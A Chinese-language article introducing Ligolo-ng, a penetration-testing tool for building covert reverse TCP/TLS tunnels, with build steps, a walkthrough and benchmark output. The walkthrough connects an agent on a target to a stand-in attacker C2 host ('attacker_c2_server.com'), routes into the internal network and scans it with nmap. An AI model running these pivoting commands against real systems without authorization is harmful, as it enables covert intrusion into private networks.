![](https://image.3001.net/images/20210917/1631841068_6143eb2ccea3e7e2d386a.png!small)

## 关于Ligolo-ng

 **Ligolo-ng是一款高级信道工具，该工具基于TUN接口实现其功能。** Ligolo-ng是一款轻量级的快速工具，可以帮助广大渗透测试人员利用反向TCP/TLS连接建立一条隐蔽的通信信道，而且无需SOCKS支持。

## 功能介绍

Tun接口（不再需要SOCKS）；

简单的UI界面，支持选择代理和网络信息；

易于使用，易于安装；

基于Let’s Encrypt的自动化证书配置；

高性能（多路复用）；

不需要高级权限；

套接字监听/代理绑定；

多平台代理支持；

## 工具构建

### 构建Ligolo-ng

    
    
    $ go build -o agent cmd/agent/main.go
    
    $ go build -o proxy cmd/proxy/main.go
    
    # Build agent for Windows
    
    $ GOOS=windows go build -o agent.exe cmd/agent/main.go

### 安装Ligolo-ng

我们需要在自己的命令控制服务器上开启代理服务，默认使用11601端口监听：

    
    
    $ sudo ip tuntap add user [your_username] mode tun ligolo
    
    $ sudo ip link set ligolo up
    
    $ ./proxy -h # Help options
    
    $ ./proxy -autocert # Automatically request LetsEncrypt certificates

## 工具使用

首先，我们需要在目标设备上启动代理（无需特殊权限）：

    
    
    $ ./agent -connect attacker_c2_server.com:11601

此时，代理服务器上将出现一条会话链接：

    
    
    INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"

使用“session”命令选择代理：

    
    
    ligolo-ng » session
    
    ? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000

使用“ifconfig”命令显示代理的网络配置信息：

    
    
    [Agent : nchatelain@nworkstation] » ifconfig
    
    [...]
    
    ┌─────────────────────────────────────────────┐
    
    │ Interface 3                                 │
    
    ├──────────────┬──────────────────────────────┤
    
    │ Name         │ wlp3s0                       │
    
    │ Hardware MAC │ de:ad:be:ef:ca:fe            │
    
    │ MTU          │ 1500                         │
    
    │ Flags        │ up|broadcast|multicast       │
    
    │ IPv4 Address │ 192.168.0.30/24             │
    
    └──────────────┴──────────────────────────────┘

在代理/中继服务器上添加一条指向192.168.0.0/24代理网络的路由：

    
    
    $ sudo ip route add 192.168.0.0/24 dev ligolo

最后，在代理上开启一条通信信道：

    
    
    [Agent : nchatelain@nworkstation] » start
    
    [Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   

现在，你就可以通过代理服务器访问192.168.0.0/24代理网络：

    
    
    $ nmap 192.168.0.0/24 -v -sV -n
    
    [...]
    
    $ rdesktop 192.168.0.123
    
    [...]

## 支持的协议/数据包

TCP

UDP

ICMP

## 性能

在Ligolo-ng的帮助下，你可以轻松达到100
Mbits/秒的速度。下面给出的测试结果是在一台200Mbits/s服务器上使用iperf测试的一条200Mbits/s的链接：

    
    
    $ iperf3 -c 10.10.0.1 -p 24483
    
    Connecting to host 10.10.0.1, port 24483
    
    [  5] local 10.10.0.224 port 50654 connected to 10.10.0.1 port 24483
    
    [ ID] Interval           Transfer     Bitrate         Retr  Cwnd
    
    [  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes       
    
    [  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes       
    
    [  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes       
    
    [  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes       
    
    [  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes       
    
    [  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes       
    
    [  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes       
    
    [  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes       
    
    [  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes       
    
    [  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes       
    
    - - - - - - - - - - - - - - - - - - - - - - - - -    
    [ ID] Interval           Transfer     Bitrate         Retr
    
    [  5]   0.00-10.00  sec   127 MBytes   106 Mbits/sec    2             sender
    
    [  5]   0.00-10.08  sec   125 MBytes   104 Mbits/sec                  receiver

## 注意事项

由于代理并不是以高级权限运行的，因此无法转发原始数据包。当你执行“NMAP SYN-SCAN”的时候，代理上会执行一次TCP connect()。

在使用Nmap时，你应该使用“--unprivileged”或“-PE”以避免假阳性。

## 工具使用演示

 **视频地址：** 【[ _点我观看_](https://user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4)】

## 项目地址

 **Ligolo-ng：** 【[ _GitHub传送门_](https://github.com/tnpitsecurity/ligolo-ng)】

